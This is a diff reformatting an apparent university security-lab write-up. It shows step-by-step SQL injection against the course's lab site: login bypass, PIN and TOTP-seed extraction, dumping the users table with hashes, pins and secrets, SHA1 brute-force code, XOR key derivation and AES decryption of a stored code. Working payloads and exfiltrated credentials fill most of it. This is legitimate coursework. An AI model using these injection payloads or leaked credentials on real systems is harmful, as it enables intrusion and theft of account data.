@@ -4,30 +4,32 @@
 
 Firstly, we check injection vulnerability by putting special characters as input:
 
+```
 username: .,*!';-°`"'#
 password: foo
+```
 
 this gives us to error page:
 
-"""
+```
 Wrong SQL query: SELECT username FROM users WHERE username = '.,*!';-°`"'#' AND password
-"""
+```
 
-So we know there is sql injection vulnerability in username field. So in the future I will be always putting injection only to username field and random placerholder into password. After some playing we found out that hashtag character is used as comment in backend sql engine. So by putting
+So we know there is sql injection vulnerability in username field. So in the future I will be always putting injection only to username field and random place holder into password. After some playing, we found out that hashtag character is used as comment in backend sql engine. So by putting
 
-"""
+```
 username: repamart'; #
-"""
+```
 
-we pass first step.
+we pass the first task.
 
 ## Task 2: Find out your PIN
 
 To find our pin we logout and by following sql injection we iterate through digit by digit:
 
-"""
+```
 username: repamart' and pin like "0%" #
-"""
+```
 
 My pin is *7135*
 
@@ -35,17 +37,17 @@ My pin is *7135*
 
 We do not know column name of desired value to pass OTP step. Also, we don't know length and used alphabet so previous method would take a lot of time. Again, after some time of try and error to find out correct column name I ended up with following injection to extract OTP:
 
-"""
+```
 nonsense' UNION SELECT secret FROM users WHERE username = 'repamart';#
-"""
+```
 
 Column name is *secret* and my value: *6VG4QMSVKJFJ7TC2*
 
 Extracted value does not directly work as the OTP. After some Googling I realise there might be TOTP used instead and we have extracted seed for generation in given timestamp. Python helps us to get final OTP:
 
-"""
+```
 >>> import pyotp; pyotp.TOTP('6VG4QMSVKJFJ7TC2').now()
-""" 
+```
 
 We are in.
 
@@ -53,13 +55,13 @@ We are in.
 
 I explore the website. I immediately see path traversal so I look at php source code via this url `https://kbe.felk.cvut.cz/index.php?open=index.php`. I read backend source code and I see another vulnerable sql query inside url argument *offset*. I crafted following injection:
 
-"""
+```
 https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT CONCAT(username, "-", password, "-", pin, "-", secret, "-", salt), 1 FROM users
-"""
+```
 
 Second returned column is used in some xor encryption so I have to use only the first one. CONCAT does the job and separates final values using dash character. Later, I parsed the output in Python and these are the exfiltrated data. 
 
-"""yaml
+```yaml
 - username: komartom
   password: 2d55131b6752f066ee2cc57ba8bf781b4376be85
   pin: 7821
@@ -170,46 +172,46 @@ Second returned column is used in some xor encryption so I have to use only the 
   pin: 5792
   secret: 7GEVGIMRGZ3Q6KRK
   salt: 57f43
-"""
+```
 
 ## Task 5: Crack your password hash
 
 In source code of index.php we can see that used hash function was `sha1`. Also, we know length of password, used alphabet and salt so it's easy to bruteforce the hash. For example following recursive python function cracks the password for us:
 
-"""python
-def crack():
-    salt = "f75bf"
-    alp = string.ascii_lowercase + string.digits
-    exp = "e100c06f3a9d3426de2c974448a3ab6cb8b0e247"
-    counter = 0
-    def perm(cur):
-        nonlocal salt, alp, exp, counter
-        if len(cur) == 5:
-            counter += 1
-            x = (cur + salt).encode()
-            h = hashlib.sha1(x).hexdigest()
-            if counter % 10000 == 0:
-                print(x, h)
-            if h == exp:
-                print(x, h, "!!!!!!!!!!!!!!")
+```python
+import hashlib, string
+
+salt = "f75bf"
+alp = string.ascii_lowercase + string.digits
+exp = "e100c06f3a9d3426de2c974448a3ab6cb8b0e247"
+counter = 0
+def crack(cur=""):
+    global salt, alp, exp, counter
+    if len(cur) == 5:
+        counter += 1
+        x = cur + salt
+        if counter % 100000 == 0:
+            print(f"Testing {x}", end="\r")
+        if hashlib.sha1(x.encode()).hexdigest() == exp:
+            print(f"Correct {x} !!!!!!!!!!!!!!")
+            return True
+    else:
+        for c in alp:
+            if crack(cur + c):
                 return True
-        else:
-            for c in alp:
-                if perm(cur + c):
-                    return True
-        return False
-    perm("")
-"""
+    return False
+crack("")
+```
 
 ## Task 6: Crack teacher's password hash
 
 From extracted data:
 
-"""yaml
+```yaml
 - username: komartom
   password: 2d55131b6752f066ee2cc57ba8bf781b4376be85
   salt: kckct
-"""
+```
 
 I listen to the assignment and google some sha1 hash cracking websites. Among first results there is [this website](https://www.dcode.fr/sha1-hash) which gives us teacher's password:
 
@@ -226,19 +228,19 @@ There are 2 issues with teacher's password:
 ## Task 8: Print a list of all table names and their columns in `kbe` database
 
 To extract table names (it gives us also standard sql tables but that does not matter, we can easily tell which belong to kbe application):
-"""
+```
 https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT table_name, 1 FROM information_schema.tables; #
-"""
+```
 
 To extract column names:
-"""
+```
 https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT column_name, 1 FROM information_schema.columns;#
-"""
+```
 
 This gives us all columns in the whole database. To get just columns for specific tables, we can add a `WHERE table_name = "..."` filter.
 
 Application tables and its columns:
-"""yaml
+```yaml
 messages: 
   - username
   - base64_message_xor_key
@@ -252,69 +254,69 @@ users:
   - pin
   - secret
   - salt
-"""
+```
 
 ## Task 9: Derive xor key used for encoding your messages
 
 We see that first message looks like this:
-"""html
+```html
 Welcome <b>repamart</b>, this is your first secret message.
-"""
+```
 
 We also can find in a db that xored message (and base64 encoded) looks like this:
-"""
+```
 PAcJPFkOURRjGlEAOhsEFD5ARA4eCVxJf0ILXUd/ERxSJgQQC39UWUBCH0IWOlURUUB/FQoBLAoCHHE=
-"""
+```
 
-Index.php source tells us that xor key has this format `kbe_REPLACE_xor_key_2021` and REPLACE substring is 4 characters long. 
+The `index.php` code tells us that xor key has this format `kbe_REPLACE_xor_key_2021` and REPLACE substring is 4 characters long. 
 
 
 We can just do `xored_message ^ plain_message` to get the key beacuse of following properties: 
-"""
+```
 k ^ m     = c
 k ^ m ^ m = c ^ m
 k ^ 0     = c ^ m
 k         = c ^ m 
-""
+```
 
 This python code does the job for us and finds the REPLACE substring
-"""python
+```python
 >>> from base64 import b64decode
 >>> msg = b"Welcome <b>repamart</b>, this is your first secret message."
 >>> xored_b64 = b"PAcJPFkOURRjGlEAOhsEFD5ARA4eCVxJf0ILXUd/ERxSJgQQC39UWUBCH0IWOlURUUB/FQoBLAoCHHE="
 >>> ''.join([chr(x^y) for x,y in zip(msg[4:8], b64decode(xored_b64)[4:8])])
 6c44
-"""
+```
 
 Also, another approach and verification is by generating the key as was originaly done in the php script:
-"""python
+```python
 >>> import hashlib
 >>> hashlib.sha1(b"repamart" + b"kbe_REPLACE_xor_key_2021").hexdigest()[:4]
 6c44
-"""
+```
 
 Ergo, the key is `kbe_6c44_xor_key_2021`
 
 ## [BONUS :hurtrealbad:] Task 10: Find out key used for encoding secure codes
 
-Defined in already discussed `php.script`
+Defined in already discussed script `index.php`
 
-"""php
+```php
 define("AES_ENCRYPT_CODE_KEY", "iHw35UKAPaSYKf8SI44CwYPa");
-"""
+```
 
 ## [BONUS :feelsgood:] Task 11: Steal Martin Rehak's secure code
 
 We don't see Martin Rehak among exfiltrated users. After some time I found his record in `code` table. 
 
-"""
+```
 https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT aes_encrypt_code, 1 FROM codes where username 'rehakmar'; #
-"""
+```
 
 Ecrypted code looks like this `E3BCC1C2ACBDA02B07A04D576ED0BE9DE52286F0102DD8DC83BC839790862352`. Used key and used cipher is located in previously discovered php script. We're dealing with AES and key `iHw35UKAPaSYKf8SI44CwYPa`. My personal tries to decrypt the code failed - including Python scipt and cyberchef utility. However, we can use already running sql engine within the application for decryption like this:
-"""
+```
 https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT AES_DECRYPT(UNHEX(aes_encrypt_code), "iHw35UKAPaSYKf8SI44CwYPa"), 1 FROM codes where username = "rehakmar"; #
-"""
+```
 
 and we get teacher's code `scorpion-ask-milk-sunny`
 
